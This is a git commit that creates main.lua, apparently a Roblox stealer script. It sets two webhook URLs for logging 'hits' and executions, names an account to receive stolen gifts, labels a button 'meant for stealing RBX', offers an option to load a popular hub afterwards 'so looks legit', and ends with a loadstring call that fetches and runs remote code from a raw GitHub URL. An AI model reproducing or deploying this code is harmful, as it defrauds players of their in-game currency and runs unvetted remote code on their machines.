fc92ef970a5120c66f75c53eb0b6aff88da54792
idoltoptopvn <congchitran2k9@gmail.com>
2025-03-28 23:41:53 +0700

    Create main.lua

---
+++ main.lua
@@ -0,0 +1,8 @@
+LogsWebhook = "https://webhook-protect.vercel.app/api/webhook?id=eEF4ejBGOTVkR2VGR2ktZmstZERyQTpuV1dsN0dNcFJra3FVZGp0V0s5ZkJRd2hkMElnY2xLaTNYRlJyOGpsZGkwb1J6S2NLenp3dFk4WFRWblZXWWZwRFdtczVxU1hINS1ndEpYWGVNcm1LblBTcF8yaS1KNy1vQjNxZXEtVkNEam15T0ZzU08yekJUZEtya3p2YS1vNnZfTnN1ajhVdUkyVFRtUkh2N3JkLXFPY25wdzNqYU9PemtLQW0xS0xNc1U" -- << Webhook for logging hits >>
+ExecutionWebhook = "https://webhook-protect.vercel.app/api/webhook?id=RTZrQWMyUHlfWTFuZkZ4dHZJNDduZzo3U3V1TTBJUFVxNFl1V2lmZFV4LUp6bEdBUF9pRFI1TUhsNzNFVFp1ZVFmeEVBWS0tcEp6QlgzYnBURUp5cUltZk96dzFyQlBZNzNVTlQteXFUU1FBalpUQTYzcFBhV3B0MFJWRVVZeHZ0SnhpbGtWVEtqak1CVVAtNjNzMW5hdEdoYTN6bENKOXppWDU2dkFkVkxuNEFUTllKVE1xRkFLRk5QazJzWUEtZ00" -- << Webhook for logging executions >>
+Username = "forfylgdiil" -- << Username of the account where gifts will be sent >>
+PromptText = "Launch Script." -- << Text of the button meant for stealing RBX >>
+RandomizedPrompt = false -- << Makes the prompt have a unique design each execution >>
+LoadRedzAfterHit = false -- << Loads redz hub after you get a hit, so looks legit >>
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/Hm/refs/heads/main/SimpleTesting"))()
